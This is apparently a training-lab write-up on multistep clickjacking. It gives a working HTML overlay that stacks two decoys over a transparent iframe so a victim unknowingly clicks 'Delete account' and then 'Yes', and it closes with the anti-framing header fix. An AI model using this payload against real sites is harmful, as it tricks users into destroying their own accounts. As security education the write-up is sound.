# Lab 5: Multistep clickjacking

**Difficulty:** Practitioner

## Goal

Use clickjacking to delete the victim's account. Unlike the single-click labs, the action takes **two** clicks: **Delete account**, then **Yes** on a confirmation. So the exploit needs two decoys, clicked in sequence.

## The key insight

A multistep action just means a multistep clickjack. You stack **two decoys** over the transparent iframe, each aligned over the button for its step. The victim clicks decoy 1 (Delete account), the confirmation loads inside the same iframe, and decoy 2 (Yes) is already positioned over the confirm button. Two clicks, account gone.

## Exploit

```html
<style>
  iframe { position: relative; width: 500px; height: 700px; opacity: 0.0001; z-index: 2; }
  .firstClick, .secondClick { position: absolute; top: 495px; left: 50px; z-index: 1; }
  .secondClick { top: 295px; left: 225px; }
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://LAB-ID.web-security-academy.net/my-account"></iframe>
```

- `firstClick` sits over **Delete account**; `secondClick` sits over the **Yes** confirm button.
- The iframe loads plain `/my-account` (no query parameter - this lab has no field to prefill).
- Tune the offsets in the exploit-server preview: align decoy 1, click it so the confirmation appears, then align decoy 2 over Yes.

## How I solved it

1. Framed `/my-account` and laid two decoys over the Delete account and Yes buttons
2. Aligned `firstClick` over Delete account, clicked it so the confirm dialog loaded, then aligned `secondClick` over Yes
3. Verified by deleting my own account through the decoys, then delivered to victim and the lab solved

(Clickbandit can record the two-click sequence automatically, but on an authenticated self-deleting flow it was fiddly - the hand-written two-decoy overlay was more reliable here.)

## Why it works

Each step is an ordinary clickjack; chaining two of them handles a confirmation step. Nothing about requiring a second "are you sure?" click stops it, because the victim issues both genuine clicks themselves.

## Takeaway

Confirmation dialogs are not an anti-clickjacking control - an attacker just stacks another decoy. The real fix is the same as every lab in this category: anti-framing headers (`X-Frame-Options` / CSP `frame-ancestors`) so the page cannot be put in a frame at all.
